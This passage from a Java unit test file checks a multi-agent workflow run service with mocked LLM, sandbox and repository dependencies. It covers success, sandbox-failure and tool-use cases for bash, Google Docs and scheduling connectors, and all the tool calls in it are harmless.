        com.agentsystem.workflow.entity.WorkflowAgent peer1 = new com.agentsystem.workflow.entity.WorkflowAgent();
        peer1.setId(1L);
        peer1.setName("Peer1");
        peer1.setRole(com.agentsystem.workflow.entity.WorkflowAgent.AgentRole.PEER);
        peer1.setSystemPrompt("You are agent 1.");

        com.agentsystem.workflow.entity.WorkflowAgent peer2 = new com.agentsystem.workflow.entity.WorkflowAgent();
        peer2.setId(2L);
        peer2.setName("Peer2");
        peer2.setRole(com.agentsystem.workflow.entity.WorkflowAgent.AgentRole.PEER);
        peer2.setSystemPrompt("You are agent 2.");

        when(workflowService.findById("wf-2")).thenReturn(java.util.Optional.of(workflow));
        when(agentRepo.findByWorkflowIdOrderByOrderIndex("wf-2")).thenReturn(List.of(peer1, peer2));
        when(workflowService.parseTools(any())).thenReturn(List.of());
        when(workflowService.parseSkillIds(any())).thenReturn(List.of());
        when(sandboxService.createSandbox(any(), any())).thenReturn(null);
        when(llmProperties.getDefaultModel()).thenReturn(null);
        when(logRepo.save(any())).thenAnswer(i -> i.getArgument(0));
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        ChatClient.ChatClientRequestSpec promptSpec = mock(ChatClient.ChatClientRequestSpec.class);
        ChatClient.CallResponseSpec callSpec = mock(ChatClient.CallResponseSpec.class);
        when(chatClient.prompt()).thenReturn(promptSpec);
        when(promptSpec.system(anyString())).thenReturn(promptSpec);
        when(promptSpec.user(anyString())).thenReturn(promptSpec);
        when(promptSpec.call()).thenReturn(callSpec);
        when(callSpec.content()).thenReturn("Team result.");

        WorkflowRun run = new WorkflowRun("run-2", "wf-2", "owner@test.com", "Analyze data");
        executeRunDirectly(run);

        assertThat(run.getStatus()).isEqualTo(WorkflowRun.RunStatus.DONE);
    }

    @Test
    void executeRun_sandboxStartupException_failsRun() throws Exception {
        Workflow workflow = new Workflow();
        workflow.setId("wf-3");
        workflow.setName("Sandbox Fail Workflow");
        workflow.setAgentPattern(Workflow.AgentPattern.ORCHESTRATOR);
        workflow.setSelectedModel(null);

        com.agentsystem.workflow.entity.WorkflowAgent mainAgent = new com.agentsystem.workflow.entity.WorkflowAgent();
        mainAgent.setId(1L);
        mainAgent.setName("Main");
        mainAgent.setRole(com.agentsystem.workflow.entity.WorkflowAgent.AgentRole.MAIN);
        mainAgent.setSystemPrompt("You are helpful.");

        when(workflowService.findById("wf-3")).thenReturn(java.util.Optional.of(workflow));
        when(agentRepo.findByWorkflowIdOrderByOrderIndex("wf-3")).thenReturn(List.of(mainAgent));
        when(workflowService.parseTools(any())).thenReturn(List.of());
        when(sandboxService.createSandbox(any(), any()))
                .thenThrow(new SandboxService.SandboxStartupException("docker failed"));
        when(logRepo.save(any())).thenAnswer(i -> i.getArgument(0));
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        WorkflowRun run = new WorkflowRun("run-3", "wf-3", "owner@test.com", "Do task");
        executeRunDirectly(run);

        assertThat(run.getStatus()).isEqualTo(WorkflowRun.RunStatus.FAILED);
    }

    @Test
    void executeRun_workflowNotFound_throwsRuntimeException() {
        when(workflowService.findById("wf-missing")).thenReturn(java.util.Optional.empty());

        WorkflowRun run = new WorkflowRun("run-4", "wf-missing", "owner@test.com", "Input");

        assertThatThrownBy(() -> executeRunDirectly(run))
                .hasCauseInstanceOf(RuntimeException.class);
    }

    @Test
    void executeRun_teamSequentialPattern_completesSuccessfully() throws Exception {
        Workflow workflow = new Workflow();
        workflow.setId("wf-seq");
        workflow.setName("Sequential Workflow");
        workflow.setAgentPattern(Workflow.AgentPattern.TEAM);
        workflow.setTeamExecMode(Workflow.TeamExecMode.SEQUENTIAL);
        workflow.setSelectedModel(null);

        com.agentsystem.workflow.entity.WorkflowAgent peer1 = new com.agentsystem.workflow.entity.WorkflowAgent();
        peer1.setId(10L);
        peer1.setName("PeerA");
        peer1.setRole(com.agentsystem.workflow.entity.WorkflowAgent.AgentRole.PEER);
        peer1.setSystemPrompt("You are agent A.");

        com.agentsystem.workflow.entity.WorkflowAgent peer2 = new com.agentsystem.workflow.entity.WorkflowAgent();
        peer2.setId(11L);
        peer2.setName("PeerB");
        peer2.setRole(com.agentsystem.workflow.entity.WorkflowAgent.AgentRole.PEER);
        peer2.setSystemPrompt("You are agent B.");

        when(workflowService.findById("wf-seq")).thenReturn(java.util.Optional.of(workflow));
        when(agentRepo.findByWorkflowIdOrderByOrderIndex("wf-seq")).thenReturn(List.of(peer1, peer2));
        when(workflowService.parseTools(any())).thenReturn(List.of());
        when(workflowService.parseSkillIds(any())).thenReturn(List.of());
        when(sandboxService.createSandbox(any(), any())).thenReturn("container-seq");
        when(llmProperties.getDefaultModel()).thenReturn(null);
        when(logRepo.save(any())).thenAnswer(i -> i.getArgument(0));
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        ChatClient.ChatClientRequestSpec promptSpec = mock(ChatClient.ChatClientRequestSpec.class);
        ChatClient.CallResponseSpec callSpec = mock(ChatClient.CallResponseSpec.class);
        when(chatClient.prompt()).thenReturn(promptSpec);
        when(promptSpec.system(anyString())).thenReturn(promptSpec);
        when(promptSpec.user(anyString())).thenReturn(promptSpec);
        when(promptSpec.call()).thenReturn(callSpec);
        when(callSpec.content()).thenReturn("Sequential result from each agent.");

        WorkflowRun run = new WorkflowRun("run-seq", "wf-seq", "owner@test.com", "Analyze sequentially");
        executeRunDirectly(run);

        assertThat(run.getStatus()).isEqualTo(WorkflowRun.RunStatus.DONE);
        assertThat(run.getFinalOutput()).isNotBlank();
        // recycleSandbox called between steps (peers.size - 1 times = 1)
        verify(sandboxService, atLeastOnce()).recycleSandbox("container-seq");
    }

    @Test
    void executeRun_sandboxKilledException_failsRun() throws Exception {
        Workflow workflow = new Workflow();
        workflow.setId("wf-kill");
        workflow.setName("Kill Workflow");
        workflow.setAgentPattern(Workflow.AgentPattern.ORCHESTRATOR);
        workflow.setSelectedModel(null);

        com.agentsystem.workflow.entity.WorkflowAgent mainAgent = new com.agentsystem.workflow.entity.WorkflowAgent();
        mainAgent.setId(1L);
        mainAgent.setName("Main");
        mainAgent.setRole(com.agentsystem.workflow.entity.WorkflowAgent.AgentRole.MAIN);

        when(workflowService.findById("wf-kill")).thenReturn(java.util.Optional.of(workflow));
        when(agentRepo.findByWorkflowIdOrderByOrderIndex("wf-kill")).thenReturn(List.of(mainAgent));
        when(workflowService.parseTools(any())).thenReturn(List.of());
        when(sandboxService.createSandbox(any(), any()))
                .thenThrow(new SandboxService.SandboxKilledException("killed by watchdog"));
        when(logRepo.save(any())).thenAnswer(i -> i.getArgument(0));
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        WorkflowRun run = new WorkflowRun("run-kill", "wf-kill", "owner@test.com", "task");
        executeRunDirectly(run);

        assertThat(run.getStatus()).isEqualTo(WorkflowRun.RunStatus.FAILED);
    }

    @Test
    void executeRun_sandboxQueueFullException_failsRun() throws Exception {
        Workflow workflow = new Workflow();
        workflow.setId("wf-queue");
        workflow.setName("Queue Full Workflow");
        workflow.setAgentPattern(Workflow.AgentPattern.ORCHESTRATOR);
        workflow.setSelectedModel(null);

        com.agentsystem.workflow.entity.WorkflowAgent mainAgent = new com.agentsystem.workflow.entity.WorkflowAgent();
        mainAgent.setId(1L);
        mainAgent.setName("Main");
        mainAgent.setRole(com.agentsystem.workflow.entity.WorkflowAgent.AgentRole.MAIN);

        when(workflowService.findById("wf-queue")).thenReturn(java.util.Optional.of(workflow));
        when(agentRepo.findByWorkflowIdOrderByOrderIndex("wf-queue")).thenReturn(List.of(mainAgent));
        when(workflowService.parseTools(any())).thenReturn(List.of());
        when(sandboxService.createSandbox(any(), any()))
                .thenThrow(new SandboxService.SandboxQueueFullException("queue full"));
        when(logRepo.save(any())).thenAnswer(i -> i.getArgument(0));
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        WorkflowRun run = new WorkflowRun("run-queue", "wf-queue", "owner@test.com", "task");
        executeRunDirectly(run);

        assertThat(run.getStatus()).isEqualTo(WorkflowRun.RunStatus.FAILED);
    }

    @Test
    void executeRun_genericException_failsRun() throws Exception {
        Workflow workflow = new Workflow();
        workflow.setId("wf-ex");
        workflow.setName("Exception Workflow");
        workflow.setAgentPattern(Workflow.AgentPattern.ORCHESTRATOR);
        workflow.setSelectedModel(null);

        com.agentsystem.workflow.entity.WorkflowAgent mainAgent = new com.agentsystem.workflow.entity.WorkflowAgent();
        mainAgent.setId(1L);
        mainAgent.setName("Main");
        mainAgent.setRole(com.agentsystem.workflow.entity.WorkflowAgent.AgentRole.MAIN);

        when(workflowService.findById("wf-ex")).thenReturn(java.util.Optional.of(workflow));
        when(agentRepo.findByWorkflowIdOrderByOrderIndex("wf-ex")).thenReturn(List.of(mainAgent));
        when(workflowService.parseTools(any())).thenReturn(List.of());
        when(sandboxService.createSandbox(any(), any()))
                .thenThrow(new RuntimeException("unexpected failure"));
        when(logRepo.save(any())).thenAnswer(i -> i.getArgument(0));
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        WorkflowRun run = new WorkflowRun("run-ex", "wf-ex", "owner@test.com", "task");
        executeRunDirectly(run);

        assertThat(run.getStatus()).isEqualTo(WorkflowRun.RunStatus.FAILED);
    }

    // ── executeRun — tool-use ReAct loop ─────────────────────────────────────

    @Test
    void executeRun_bashToolUse_exercisesReActLoop() throws Exception {
        Workflow workflow = new Workflow();
        workflow.setId("wf-bash");
        workflow.setName("Bash Tool Workflow");
        workflow.setAgentPattern(Workflow.AgentPattern.ORCHESTRATOR);
        workflow.setSelectedModel(null);

        com.agentsystem.workflow.entity.WorkflowAgent mainAgent = new com.agentsystem.workflow.entity.WorkflowAgent();
        mainAgent.setId(1L);
        mainAgent.setName("Main");
        mainAgent.setRole(com.agentsystem.workflow.entity.WorkflowAgent.AgentRole.MAIN);
        mainAgent.setSystemPrompt("Use bash tools to complete tasks.");

        when(workflowService.findById("wf-bash")).thenReturn(java.util.Optional.of(workflow));
        when(agentRepo.findByWorkflowIdOrderByOrderIndex("wf-bash")).thenReturn(List.of(mainAgent));
        when(workflowService.parseTools(any())).thenReturn(List.of("BASH", "PYTHON"));
        when(workflowService.parseSkillIds(any())).thenReturn(List.of());
        when(sandboxService.createSandbox(any(), any())).thenReturn(null);
        when(llmProperties.getDefaultModel()).thenReturn(null);
        when(logRepo.save(any())).thenAnswer(i -> i.getArgument(0));
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));

        ChatClient.ChatClientRequestSpec promptSpec = mock(ChatClient.ChatClientRequestSpec.class);
        ChatClient.CallResponseSpec callSpec = mock(ChatClient.CallResponseSpec.class);
        when(chatClient.prompt()).thenReturn(promptSpec);
        when(promptSpec.system(anyString())).thenReturn(promptSpec);
        when(promptSpec.user(anyString())).thenReturn(promptSpec);
        when(promptSpec.call()).thenReturn(callSpec);
        // First call returns a bash tool use, second call returns the final answer
        when(callSpec.content())
                .thenReturn("<use_tool name=\"bash\">echo hello world</use_tool>")
                .thenReturn("Final answer: hello world");

        WorkflowRun run = new WorkflowRun("run-bash", "wf-bash", "owner@test.com", "Run bash");
        executeRunDirectly(run);

        assertThat(run.getStatus()).isEqualTo(WorkflowRun.RunStatus.DONE);
    }

    @Test
    void executeRun_connectorToolUse_exercisesConnectorDispatch() throws Exception {
        Workflow workflow = new Workflow();
        workflow.setId("wf-conn");
        workflow.setName("Connector Workflow");
        workflow.setAgentPattern(Workflow.AgentPattern.ORCHESTRATOR);
        workflow.setSelectedModel(null);

        com.agentsystem.workflow.entity.WorkflowAgent mainAgent = new com.agentsystem.workflow.entity.WorkflowAgent();
        mainAgent.setId(1L);
        mainAgent.setName("Main");
        mainAgent.setRole(com.agentsystem.workflow.entity.WorkflowAgent.AgentRole.MAIN);
        mainAgent.setSystemPrompt("Use Google Docs to create documents.");

        when(workflowService.findById("wf-conn")).thenReturn(java.util.Optional.of(workflow));
        when(agentRepo.findByWorkflowIdOrderByOrderIndex("wf-conn")).thenReturn(List.of(mainAgent));
        when(workflowService.parseTools(any())).thenReturn(List.of("CONNECTOR_GOOGLE_DOCS"));
        when(workflowService.parseSkillIds(any())).thenReturn(List.of());
        when(sandboxService.createSandbox(any(), any())).thenReturn(null);
        when(llmProperties.getDefaultModel()).thenReturn(null);
        when(logRepo.save(any())).thenAnswer(i -> i.getArgument(0));
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));
        when(googleDocsService.createDocument(anyString(), anyString(), anyString(), any()))
                .thenReturn("https://docs.google.com/document/d/abc/edit");

        ChatClient.ChatClientRequestSpec promptSpec = mock(ChatClient.ChatClientRequestSpec.class);
        ChatClient.CallResponseSpec callSpec = mock(ChatClient.CallResponseSpec.class);
        when(chatClient.prompt()).thenReturn(promptSpec);
        when(promptSpec.system(anyString())).thenReturn(promptSpec);
        when(promptSpec.user(anyString())).thenReturn(promptSpec);
        when(promptSpec.call()).thenReturn(callSpec);
        when(callSpec.content())
                .thenReturn("<use_tool name=\"GOOGLE_DOCS_WRITE\">{\"title\":\"Report\",\"content\":\"Hello World\"}</use_tool>")
                .thenReturn("Document created successfully.");

        WorkflowRun run = new WorkflowRun("run-conn", "wf-conn", "owner@test.com", "Create a doc");
        executeRunDirectly(run);

        assertThat(run.getStatus()).isEqualTo(WorkflowRun.RunStatus.DONE);
    }

    @Test
    void executeRun_scheduleToolUse_exercisesScheduleDispatch() throws Exception {
        Workflow workflow = new Workflow();
        workflow.setId("wf-sched");
        workflow.setName("Schedule Workflow");
        workflow.setAgentPattern(Workflow.AgentPattern.ORCHESTRATOR);
        workflow.setSelectedModel(null);

        com.agentsystem.workflow.entity.WorkflowAgent mainAgent = new com.agentsystem.workflow.entity.WorkflowAgent();
        mainAgent.setId(1L);
        mainAgent.setName("Main");
        mainAgent.setRole(com.agentsystem.workflow.entity.WorkflowAgent.AgentRole.MAIN);

        when(workflowService.findById("wf-sched")).thenReturn(java.util.Optional.of(workflow));
        when(agentRepo.findByWorkflowIdOrderByOrderIndex("wf-sched")).thenReturn(List.of(mainAgent));
        when(workflowService.parseTools(any())).thenReturn(List.of("SCHEDULE"));
        when(workflowService.parseSkillIds(any())).thenReturn(List.of());
        when(sandboxService.createSandbox(any(), any())).thenReturn(null);
        when(llmProperties.getDefaultModel()).thenReturn(null);
        when(logRepo.save(any())).thenAnswer(i -> i.getArgument(0));
        when(runRepo.save(any())).thenAnswer(i -> i.getArgument(0));
        when(workflowScheduleClient.listSchedules(anyString(), anyString())).thenReturn("[]");

        ChatClient.ChatClientRequestSpec promptSpec = mock(ChatClient.ChatClientRequestSpec.class);
        ChatClient.CallResponseSpec callSpec = mock(ChatClient.CallResponseSpec.class);
        when(chatClient.prompt()).thenReturn(promptSpec);
        when(promptSpec.system(anyString())).thenReturn(promptSpec);
        when(promptSpec.user(anyString())).thenReturn(promptSpec);
        when(promptSpec.call()).thenReturn(callSpec);
        when(callSpec.content())
                .thenReturn("<use_tool name=\"SCHEDULE\">{\"action\":\"list\",\"conversationId\":\"conv-1\"}</use_tool>")
                .thenReturn("No schedules found.");

        WorkflowRun run = new WorkflowRun("run-sched", "wf-sched", "owner@test.com", "List schedules");
        executeRunDirectly(run);

        assertThat(run.getStatus()).isEqualTo(WorkflowRun.RunStatus.DONE);
    }

    private void executeRunDirectly(WorkflowRun run) throws Exception {
        Method m = WorkflowRunServiceImpl.class.getDeclaredMethod("executeRun", WorkflowRun.class);
        m.setAccessible(true);
        m.invoke(service, run);
    }

    // ── reflection helpers ────────────────────────────────────────────────────

    private String callBuildOrchestratorPrompt(
            com.agentsystem.workflow.entity.WorkflowAgent main,
            List<com.agentsystem.workflow.entity.WorkflowAgent> subs) throws Exception {
        Method m = WorkflowRunServiceImpl.class.getDeclaredMethod(
                "buildOrchestratorPrompt",
                com.agentsystem.workflow.entity.WorkflowAgent.class, List.class);
        m.setAccessible(true);
        return (String) m.invoke(service, main, subs);
    }
}
